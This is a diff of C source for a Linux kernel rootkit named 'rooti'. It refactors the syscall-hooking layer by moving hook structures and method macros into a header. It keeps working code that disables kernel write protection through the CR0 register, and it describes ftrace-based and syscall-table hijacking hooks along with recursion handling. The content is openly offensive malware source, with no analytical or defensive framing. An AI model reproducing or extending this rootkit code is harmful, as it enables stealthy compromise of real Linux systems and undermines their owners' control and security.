@@ -1,76 +1,28 @@
 #include <linux/ftrace.h>
 #include <linux/kprobes.h>
 #include <linux/version.h>
-
-/*
-    Different methods of syscall hooking supported by this rootkit. The macro ROOTI_HOOKING_METHOD defined below
-    is meant to be set euqal one the these options, and it indicates the chosen hooking method.
-*/
-#define ROOTI_METHOD_TABLE_HIJACKING 0  // Classic method of overriding the pointer in the syscall table, works on older kernels
-#define ROOTI_METHOD_FTRACE 1           // Intercepting syscalls by registering an ftrace callback to handlers and modifying IP reg
-
-#define ROOTI_HOOKING_METHOD ROOTI_METHOD_FTRACE
+#include "hooking.h"
 
 unsigned long (*__kallsyms_lookup_name)(const char *name) = NULL;
 
 /*
-    Represents a syscall hook, extra members are defined for different types of hooking methods but
-    the first three members are always defined and used for specifying the desired syscall, providing the hook function
-    and for accessing the original syscall handler for use in the hook.
-*/ 
-struct rooti_syscall_hook {
-    const char *name;      // hooked syscall name
-    void *func;            // pointer to hook function
-    void *orig;            // pointer to the original function
-    unsigned long addr;    // memory address of the original function
-
-#if ROOTI_HOOKING_METHOD == ROOTI_METHOD_TABLE_HIJACKING
-    unsigned int idx;      // index of the syscall in the kernel syscall table
-#elif ROOTI_HOOKING_METHOD == ROOTI_METHOD_FTRACE
-    struct ftrace_ops ops; // ftrace configuration
-#endif
-};
-
-/* Public functions prototypes */
-int rooti_hooking_init(void);
-int rooti_install_hook(struct rooti_syscall_hook *hook);
-int rooti_install_hooks(struct rooti_syscall_hook *hooks, size_t count);
-void rooti_uninstall_hook(struct rooti_syscall_hook *hook);
-void rooti_uninstall_hooks(struct rooti_syscall_hook *hooks, size_t count);
-
-/* On 64 bit systems, the syscall handler symbols are prefixed with '__x64_'. */
-#ifdef CONFIG_X86_64
-#define ROOTI_SYSCALL_NAME(name) ("__x64_" name)
-#else
-#define ROOTI_SYSCALL_NAME(name) (name)
-#endif
-
-/* Shorthand for initializing syscall hook objects */
-#define ROOTI_HOOK(_name, _hook, _orig) \
-{ \
-    .name = ROOTI_SYSCALL_NAME(_name), \
-    .func = (_hook), \
-    .orig = (_orig)  \
-}
-
-/*
     Custom utility function for writing intp the CR0 register. It is needed as the original function
-    from the linux headers prevents us from modifying the 16th bit of the register (in order to disable write protection).
+    from the linux headers prevents us from modifying the 16th bit of the register (to disable write protection).
 */
-static inline void rooti_force_write_cr0(unsigned long val)
+inline void rooti_force_write_cr0(unsigned long val)
 {
     unsigned long __force_order;
     asm volatile("mov %0, %%cr0" : "+r"(val), "+m"(__force_order));
 }
 
-/* Disable the write protcetion by clearing the 16th bit of the CR0 register */
-static inline void rooti_unprotect_memory(void)
+// Disable write protcetion by clearing the 16th bit of the CR0 register
+inline void rooti_unprotect_memory(void)
 {
     rooti_force_write_cr0(read_cr0() & (~0x10000));
 }
 
-/* Enable the write protection by setting the 16th bit of the CR0 register */
-static inline void rooti_protect_memory(void)
+// Enable write protection by setting the 16th bit of the CR0 register
+inline void rooti_protect_memory(void)
 {
     rooti_force_write_cr0(read_cr0() | (0x10000));
 }
@@ -206,8 +158,9 @@ static void rooti_uninstall_table_hijack_hook(struct rooti_syscall_hook *hook)
 /* ===================== SPECIFIC CODE FOR FTRACE METHOD ===================== */
 #elif ROOTI_HOOKING_METHOD == ROOTI_METHOD_FTRACE
 
-/* Recursion loops protection mechanism - often times hook functions from this module
- * will call the original syscall handler. The call to the original kernel function would trigger
+/* 
+ * Recursion loops protection mechanism - often times hook functions from this module
+ * will call the original syscall handler. The call to the original kernel function would trigger the
  * ftrace callback, which would in turn point to the hook function, which would call the original handler
  * and so on and so forth. We've got two ways to handle this:
  * 1. Skip the call to ftrace by setting the original syscall handler pointer (e.g rooti_syscall_hook.orig) to the memory
